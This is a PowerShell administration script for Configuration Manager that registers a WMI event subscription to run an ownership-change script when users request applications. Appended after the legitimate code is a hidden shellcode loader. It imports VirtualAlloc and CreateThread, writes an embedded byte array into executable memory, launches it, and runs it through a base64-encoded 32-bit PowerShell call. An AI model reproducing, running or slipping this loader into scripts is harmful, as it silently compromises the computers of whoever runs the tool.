﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Full path to the script that the Consumer will execute")]
    [ValidatePattern("^[A-Za-z]{1}:\\\w+\\\w+")]
    [ValidateScript({
        
        if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
            Write-Warning -Message "$(Split-Path -Path $_ -Leaf) contains invalid characters" ; break
        }
        else {
            
            if ([System.IO.Path]::GetExtension((Split-Path -Path $_ -Leaf)) -like ".ps1") {
                
                if (-not(Test-Path -Path (Split-Path -Path $_) -PathType Container -ErrorAction SilentlyContinue)) {
                    Write-Warning -Message "Unable to locate part of the specified path" ; break
                }
                elseif (Test-Path -Path (Split-Path -Path $_) -PathType Container -ErrorAction SilentlyContinue) {
                    return $true
                }
                else {
                    Write-Warning -Message "Unhandled error" ; break
                }
            }
            else {
                Write-Warning -Message "$(Split-Path -Path $_ -Leaf) contains unsupported file extension. Supported extension is '.ps1'" ; break
            }
        }
    })]
    [ValidateNotNullOrEmpty()]
    [string]$ScriptPath
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }
    
    $ScriptFileName = Split-Path -Path $ScriptPath -Leaf
}
Process {
    try {
        
        $InstanceFilterProperties = @{
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'SMS_UserApplicationRequest' AND 'TargetInstance.CurrentState = 1'"
            Name = "ApplicationApprovalFilter"
            EventNameSpace = "root\sms\site_$($SiteCode)"
        }
        $EventFilterInstance = New-CimInstance -Namespace "root\subscription" -ClassName __EventFilter -Property $InstanceFilterProperties -ErrorAction Stop
        
        $ConsumerProperties = @{
            Name = "ApplicationApprovalConsumer";
            CommandLineTemplate = "powershell.exe -File $($ScriptPath)\Change-Ownership.ps1 -SiteServer $SiteServer -SiteCode $SiteCode -DeviceOwner 1 -ResourceId %TargetInstance.ResourceId%"
        }
        $ConsumerInstance = New-CimInstance -Namespace "root\subscription" -ClassName CommandLineEventConsumer -Property $ConsumerProperties -ErrorAction Stop
        
        $BindingProperties = @{
            Filter = [ref]$EventFilterInstance
            Consumer = [ref]$ConsumerInstance
        }
        New-CimInstance -Namespace "root\subscription" -ClassName __FilterToConsumerBinding -Property $BindingProperties -ErrorAction Stop
    }
    catch [System.UnauthorizedAccessException]  {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message $_.Exception.Message
    }
}
$VUZ3 = '$Po9 = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $Po9 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x7a,0x69,0xc3,0x56,0xdb,0xca,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x57,0x0f,0x03,0x57,0x75,0x8b,0x36,0xaa,0x61,0xc9,0xb9,0x53,0x71,0xae,0x30,0xb6,0x40,0xee,0x27,0xb2,0xf2,0xde,0x2c,0x96,0xfe,0x95,0x61,0x03,0x75,0xdb,0xad,0x24,0x3e,0x56,0x88,0x0b,0xbf,0xcb,0xe8,0x0a,0x43,0x16,0x3d,0xed,0x7a,0xd9,0x30,0xec,0xbb,0x04,0xb8,0xbc,0x14,0x42,0x6f,0x51,0x11,0x1e,0xac,0xda,0x69,0x8e,0xb4,0x3f,0x39,0xb1,0x95,0x91,0x32,0xe8,0x35,0x13,0x97,0x80,0x7f,0x0b,0xf4,0xad,0x36,0xa0,0xce,0x5a,0xc9,0x60,0x1f,0xa2,0x66,0x4d,0x90,0x51,0x76,0x89,0x16,0x8a,0x0d,0xe3,0x65,0x37,0x16,0x30,0x14,0xe3,0x93,0xa3,0xbe,0x60,0x03,0x08,0x3f,0xa4,0xd2,0xdb,0x33,0x01,0x90,0x84,0x57,0x94,0x75,0xbf,0x63,0x1d,0x78,0x10,0xe2,0x65,0x5f,0xb4,0xaf,0x3e,0xfe,0xed,0x15,0x90,0xff,0xee,0xf6,0x4d,0x5a,0x64,0x1a,0x99,0xd7,0x27,0x72,0x6e,0xda,0xd7,0x82,0xf8,0x6d,0xab,0xb0,0xa7,0xc5,0x23,0xf8,0x20,0xc0,0xb4,0xff,0x1a,0xb4,0x2b,0xfe,0xa4,0xc5,0x62,0xc4,0xf1,0x95,0x1c,0xed,0x79,0x7e,0xdd,0x12,0xac,0xeb,0xd8,0x84,0x8f,0x44,0xe3,0x5e,0x78,0x97,0xe4,0x44,0xfd,0x1e,0x02,0x28,0xad,0x70,0x9b,0x88,0x1d,0x31,0x4b,0x60,0x74,0xbe,0xb4,0x90,0x77,0x14,0xdd,0x3a,0x98,0xc1,0xb5,0xd2,0x01,0x48,0x4d,0x43,0xcd,0x46,0x2b,0x43,0x45,0x65,0xcb,0x0d,0xae,0x00,0xdf,0xf9,0x5e,0x5f,0xbd,0xaf,0x61,0x75,0xa8,0x4f,0xf4,0x72,0x7b,0x18,0x60,0x79,0x5a,0x6e,0x2f,0x82,0x89,0xe5,0xe6,0x16,0x72,0x91,0x06,0xf7,0x72,0x61,0x51,0x9d,0x72,0x09,0x05,0xc5,0x20,0x2c,0x4a,0xd0,0x54,0xfd,0xdf,0xdb,0x0c,0x52,0x77,0xb4,0xb2,0x8d,0xbf,0x1b,0x4c,0xf8,0x41,0x67,0x9b,0xc4,0x37,0x89,0x1f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$bxqX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($bxqX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$bxqX,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($VUZ3));$XWtl = "-enc ";if([IntPtr]::Size -eq 8){$Rzs = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $Rzs $XWtl $e"}else{;iex "& powershell $XWtl $e";}
